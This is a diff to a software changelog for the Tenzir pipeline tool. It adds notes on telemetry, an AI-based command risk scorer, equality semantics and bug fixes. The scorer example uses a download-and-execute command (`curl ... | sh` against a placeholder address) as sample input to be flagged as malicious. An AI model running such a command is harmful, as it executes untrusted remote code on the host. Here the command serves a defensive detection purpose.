@@ -2,6 +2,66 @@ This release introduces a new data model that makes pipelines faster and lets li
 
 ## 🚀 Features
 
+### Best-effort platform pipeline telemetry
+
+Pipeline runs can now report external connector counters, lifecycle outcomes, and compile-time and runtime diagnostics to the platform. Reporting also works for standalone execution with deployment credentials:
+
+```sh
+tenzir --platform https://platform.example.com \
+  --deployment-id example-deployment --key-file deployment.key \
+  --pipeline-id example-pipeline --run 7 \
+  'from_stdin | read_lines | discard'
+```
+
+Telemetry delivery is best effort and does not enable operator profiling.
+
+*By @tobim.*
+
+### Cloudflare Workers AI and OpenAI Decisions endpoints for ai_decide
+
+The `ai_decide` operator now works with the decision models that Cloudflare Workers AI and OpenAI host, so you can triage events with a provider you already use instead of running your own System One server. Pass the URL of the model as `endpoint`.
+
+For example, rate shell commands with `gpt-6-luna` from the OpenAI Decisions API:
+
+```tql
+from {cmd: "ls -la /tmp"}, {cmd: "curl -s https://203.0.113.7/x.sh | sh"}
+ai_decide "How risky is this command for the host?",
+  scale=["Routine administration", "Unusual but plausible", "Likely malicious"],
+  state=cmd,
+  model="gpt-6-luna",
+  endpoint="https://api.openai.com/v1/decisions",
+  api_key=secret("openai-api-key")
+select cmd, score=ai.decide.answer.score
+```
+
+```tql
+{
+  cmd: "ls -la /tmp",
+  score: 0.14,
+}
+{
+  cmd: "curl -s https://203.0.113.7/x.sh | sh",
+  score: 1.87,
+}
+```
+
+The score runs from 0 for the first level to 2 for the last, so `where ai.decide.answer.score >= 1.5` keeps only the risky command.
+
+To use the open-weight Clef models on Workers AI instead, pass the run URL of the model and a Cloudflare API token. The rest of the pipeline stays the same:
+
+```tql
+from {cmd: "curl -s https://203.0.113.7/x.sh | sh"}
+ai_decide "How risky is this command for the host?",
+  scale=["Routine administration", "Unusual but plausible", "Likely malicious"],
+  state=cmd,
+  model="clef",
+  endpoint="https://api.cloudflare.com/client/v4/accounts/<account-id>/ai/run/@cf/cloudflare/clef",
+  api_key=secret("cloudflare-api-token")
+select cmd, score=ai.decide.answer.score
+```
+
+*By @mavam.*
+
 ### Encryption functions
 
 New functions encrypt and decrypt values in pipelines, so that you can protect sensitive fields and still recover them later:
@@ -332,6 +392,40 @@ The default input now leaves out the `ai` field and the `into` field, so the sec
 
 *By @mavam.*
 
+### Diagnostics for Kafka offset test failures
+
+Kafka offset-preservation test failures now include the failing case, expected and actual records, and diagnostics from both consumer runs. This makes intermittent CI failures actionable without changing Kafka consumption behavior.
+
+*By @aljazerzen.*
+
+### Equality is total
+
+The `==` and `!=` operators now always answer and never warn. Operands that cannot be equal, including operands of different types, are simply not equal:
+
+```tql
+from {
+  mismatch: "x" == 1d,
+  mismatch_neq: "x" != 1d,
+  with_null: null == 1d,
+}
+```
+
+```tql
+{
+  mismatch: false,
+  mismatch_neq: true,
+  with_null: false,
+}
+```
+
+Previously, only a `null` operand followed this rule, while two differently typed non-null operands emitted a warning and evaluated to `null`.
+
+This also makes `in` consistent with the `==` it is defined in terms of, so `"x" in [1d]` evaluates to `false` and `"x" not in [1d]` evaluates to `true`. Denylists such as `where src not in bad` now keep events whose type does not occur in the list instead of silently dropping them.
+
+The ordered comparisons `<`, `>`, `<=`, and `>=` remain partial and still evaluate to `null` for operands that have no shared order.
+
+*By @aljazerzen.*
+
 ### Filter and time-window pushdown for SentinelOne
 
 You can now query SentinelOne Data Lake entirely in TQL, without writing PowerQuery or passing `query`, `start`, or `end` to `from_sentinelone_data_lake`:
@@ -485,6 +579,12 @@ Custom disk-usage checks such as `tenzir-df-percent` once again preserve data wh
 
 *By @tobim.*
 
+### Fix memory leaks in to_udp
+
+Fixed memory leaks in `to_udp` caused by incorrect cleanup of coroutine structured bindings in optimized GCC builds. Nix builds now use GCC 16, which correctly releases these allocations.
+
+*By @IyeOnline.*
+
 ### Hang when reading stdin from a redirected file
 
 Pipelines that read stdin now finish when stdin is redirected from a file:
@@ -534,6 +634,12 @@ ai_prompt model="gpt-5-mini",
 Set `temperature` explicitly to keep the previous behavior, for example `temperature=0.0`.
 
 *By @mavam.*
+
+### Reliable subscribe metrics for short-lived pipelines
+
+The `subscribe` operator no longer loses its `tenzir.metrics.subscribe` and `tenzir.metrics.subscribe_buffer` events for pipelines that finish within the one-second metrics interval. Previously, such pipelines only emitted their metrics during an asynchronous teardown that could outlive the pipeline's metrics receiver, in which case the metrics were silently dropped.
+
+*By @aljazerzen.*
 
 ### Spurious import errors when stopping pipelines that use `python`
 
